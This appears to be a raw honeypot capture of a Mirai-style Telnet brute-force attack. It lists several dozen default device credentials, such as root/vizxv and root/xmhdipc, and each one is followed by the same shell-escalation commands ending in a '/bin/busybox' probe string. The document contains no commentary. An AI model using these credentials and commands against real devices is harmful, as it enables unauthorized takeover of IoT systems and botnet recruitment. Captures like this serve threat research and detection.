db2fenc1

ibmdb2
enable
system
shell
sh
/bin/busybox 5v7nydow
4dgifts
enable
system
shell
sh
/bin/busybox 5v7nydow
administrator

1234
enable
system
shell
sh
/bin/busybox 5v7nydow
nsroot

nsroot
enable
system
shell
sh
/bin/busybox 5v7nydow
root

admin
enable
system
shell
sh
/bin/busybox 5v7nydow
root

vizxv
enable
system
shell
sh
/bin/busybox 5v7nydow
superuser
enable
system
shell
sh
/bin/busybox 5v7nydow
tech
enable
system
shell
sh
/bin/busybox 5v7nydow
iclock

timely
enable
system
shell
sh
/bin/busybox 5v7nydow
root

123
enable
system
shell
sh
/bin/busybox 5v7nydow
apc

apc
enable
system
shell
sh
/bin/busybox 5v7nydow
diag

danger
enable
system
shell
sh
/bin/busybox 5v7nydow
root

openvpnas
enable
system
shell
sh
/bin/busybox 5v7nydow
root

ascend
enable
system
shell
sh
/bin/busybox 5v7nydow
root

123456
enable
system
shell
sh
/bin/busybox 5v7nydow
admin

diamond
enable
system
shell
sh
/bin/busybox 5v7nydow
operator
enable
system
shell
sh
/bin/busybox 5v7nydow
root

888888
enable
system
shell
sh
/bin/busybox 5v7nydow
sysadm

anicust
enable
system
shell
sh
/bin/busybox 5v7nydow
root

password
enable
system
shell
sh
/bin/busybox 5v7nydow
root

arkeia
enable
system
shell
sh
/bin/busybox 5v7nydow
admin1

password
enable
system
shell
sh
/bin/busybox 5v7nydow
admin

p@55w0rd!
enable
system
shell
sh
/bin/busybox 5v7nydow
jack
enable
system
shell
sh
/bin/busybox 5v7nydow
root

xmhdipc
enable
system
shell
sh
/bin/busybox 5v7nydow
root

openelec
enable
system
shell
sh
/bin/busybox 5v7nydow
root

12345
enable
system
shell
sh
/bin/busybox 5v7nydow
public

public
enable
system
shell
sh
/bin/busybox 5v7nydow
user

user
enable
system
shell
sh
/bin/busybox 5v7nydow
adm
enable
system
shell
sh
/bin/busybox 5v7nydow
default

video
enable
system
shell
sh
/bin/busybox 5v7nydow
ezsetup
enable
system
shell
sh
/bin/busybox 5v7nydow
chronos

facepunch
enable
system
shell
sh
/bin/busybox 5v7nydow
password
enable
system
shell
sh
/bin/busybox 5v7nydow
administrator

changeme
enable
system
shell
sh
/bin/busybox 5v7nydow
